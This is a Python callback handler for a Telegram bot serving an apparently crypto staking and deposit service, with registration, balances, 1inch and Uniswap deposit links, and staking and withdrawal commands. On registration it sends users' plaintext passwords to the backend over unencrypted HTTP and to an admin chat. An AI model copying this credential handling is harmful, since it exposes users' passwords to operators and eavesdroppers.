from telegram import *
import telegram.ext
from telegram import Update
import requests
import re
import cache
from decouple import config

TOKEN = config("TOKEN", default="")
ADMIN_CHAT_ID = config("ADMIN_CHAT_ID", default="")
Programmer_CHAT_ID = config("PROGRAMMER_CHAT_ID", default="")
address = config("ADDRESS", default="")

msg_id = cache.msg_id
reg_log_data= cache.reg_log_data
command_status = cache.command_status
command_data = cache.command_data

async def callback(update: Update,context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    global msg_id
    global command_status
    global reg_log_data
    global command_data

    query = update.callback_query
    data = query.data
    user_id = update.effective_message.chat_id
    
    if data == "register":
        req_data = {
        "user_id": user_id,
        "username": reg_log_data[user_id]['username'],
        "password": reg_log_data[user_id]['password'],
        "atomic_wallet": reg_log_data[user_id]['atomic'],
        "oneinch_wallet": reg_log_data[user_id]['one_inch'],
        "uni_wallet": reg_log_data[user_id]['uniswap']
    }
        req = requests.get(f"http://{address}/dydx/api/v1/telegramuser/")
        data = req.json()

        for user in data:
            if str(user['user_id']) == str(user_id):
                await context.bot.send_message(chat_id=user_id,text="You have already registered.")
                return
            
        req = requests.post(f"http://{address}/dydx/api/v1/telegramuser/",req_data)
        if req.status_code == 201:
            text = f"user has been registered with user_id:'{user_id}' username: '{reg_log_data[user_id]['username']}' and password: '{reg_log_data[user_id]['password']}'"
            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
            await context.bot.send_message(chat_id=user_id,text="Your registration has been completed. Please wait for confirmation.")
            msg_id = 0
        else:
            await update.message.reply_text('Something happened, we could not connect to server')
            return
        return
        
    if "balance" in data:
        match = re.search(r":(\d+)", data)
        match_name = re.search(r",(.*)", data)
        match = match.group(1)
        match_name = match_name.group(1)
        if match:
            match = float(match)
            match = f"{match:,.2f}"
            await context.bot.send_message(chat_id=user_id,text=f"Wallet Balance : {match} $")
            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=f"user got total balance information with user_id:'{user_id}' wallet: '{match_name}'")
        else:
            return

    if "deposit" in data:
        match = re.search(r":(.*)", data)
        match = match.group(1)
        if match:
            command_data[user_id] = {'wallet':match}
        else:
            command_data[user_id] = {'wallet':"?"}
        keyboard = [[InlineKeyboardButton("1Inch",callback_data='1inch'),
                                InlineKeyboardButton("Uniswap",callback_data='uniswap')]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        text = f"""1Inch or Uniswap"""
        await context.bot.send_message(chat_id=user_id, text=text, reply_markup=reply_markup,protect_content=True)

    link = ""    
    if "1inch" in data:
        text = f"user clicked on 1inch deposit with user_id:'{user_id}' and wallet name: {command_data[user_id]['wallet']}"
        await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
        req = requests.get(f"http://{address}/dydx/api/v1/wallet/")
        wallets = req.json()
        for wallet in wallets:
            if wallet['name'] == command_data[user_id]['wallet']:
                link = wallet['oneinch_link']
        link_text = f"""Use the link below to deposit to your desire wallet:
{link}"""
        await context.bot.send_message(chat_id=user_id,text=link_text)
    
    if "uniswap" in data:
        text = f"user clicked on 1inch deposit with user_id:'{user_id}' and wallet name: {command_data[user_id]['wallet']}"
        await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
        req = requests.get(f"http://{address}/dydx/api/v1/wallet/")
        wallets = req.json()
        for wallet in wallets:
            if wallet['name'] == command_data[user_id]['wallet']:
                link = wallet['uniswap_link']
        link_text = f"""Use the link below to deposit to your desire wallet:
{link}"""
        await context.bot.send_message(chat_id=user_id,text=link_text)
         
    if ("stop_staking" in data 
        or "close_positions" in data 
        or "emergency" in data 
        or "start_staking" in data
        or "withdraw" in data
        ):
        
        match = re.search(r":(\d+)", data)
        match_name = re.search(r",(.*)", data)
        match = match.group(1)
        match_name = match_name.group(1)
        if match and match_name:
            command_data[user_id] = {'wallet':match_name,"wallet_id":match}
        else:
            command_data[user_id] = {'wallet':"","wallet_id":""}
        if "start_staking" in data:
            await context.bot.send_message(chat_id=user_id,text="Please enter your desire amount")
        else:
            await context.bot.send_message(chat_id=user_id,text="Enter your password")

    if "close_no" in data:
        await context.bot.send_message(chat_id=user_id,text="Your request has been canceled")

    if "close_yes" in data:
        body_close = {
                "telegram_user": user_id,
                "wallet": command_data[user_id]['wallet_id']
            }
        req = requests.post(f"http://{address}/dydx/api/v1/allpositions/",body_close)
        if req.status_code == 200:
            await context.bot.send_message(chat_id=user_id,text="All positions has been closed")
            text = f"user closed all positions with user_id:'{user_id}' and wallet name: {command_data[user_id]['wallet']}"
            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)
        elif req.status_code == 400:
            await context.bot.send_message(chat_id=user_id,text=f"{req.json()}")
        else:
            await context.bot.send_message(chat_id=user_id,text=f"Something happened, we could not connect to server")

    if "shotdown_no" in data:
        await context.bot.send_message(chat_id=user_id,text="Emergency shutdown has been canceled")

    if "shotdown_yes" in data:
        await context.bot.send_message(chat_id=user_id,text=f"Your request has been recieved. Please wait for the process.")
        text = f"user clicked on emergency shotdown with user_id:'{user_id}' and wallet name: {command_data[user_id]['wallet']}"
        await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)

    if "again" in data:
        await context.bot.send_message(chat_id=user_id,text=f"Your registration has been canceled")
    
    if "choose_stake" in data:
        match = re.search(r":(\d+)", data)
        match = match.group(1)
        match_name = re.search(r",(\d+)", data)
        match_name = match_name.group(1)
        match = float(match)
        if match and match_name:
            await context.bot.send_message(chat_id=user_id,text=f"Your stake with the amount of {match:,.2f} and {match_name} days left will not be renewed.")
            text = f"stop staking with user_id:'{user_id}' and wallet name: {command_data[user_id]['wallet']}, volume:{match} and date:{match_name}"
            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=text)

    if "wallet_id" in data:
        match = re.search(r":(\d+)", data)
        match_name = re.search(r",(.*)", data)
        match = match.group(1)
        match_name = match_name.group(1)
        if match:
            text = "your stakes are: "
            stakes_list = []
            req = requests.get(f"http://{address}/dydx/api/v1/staking/")
            if req.status_code == 200:
                stakes = req.json()
                for stake in stakes:
                    if str(stake['wallet']) == str(match):
                        stakes_list.append(stake)
            if len(stakes_list)== 0:
                text = "You do not have any stakes"
            else:
                for s in range(len(stakes_list)):
                    text += f"""
{s+1}. Amount: {stakes_list[s]['staking_volume']:,.2f} , Days left: {stakes_list[s]['days_left']}
"""
            await context.bot.send_message(chat_id=user_id,text=text)
            await context.bot.send_message(chat_id = ADMIN_CHAT_ID,text=f"user got veiw staking reward date information with user_id:'{user_id}' wallet: '{match_name}'")
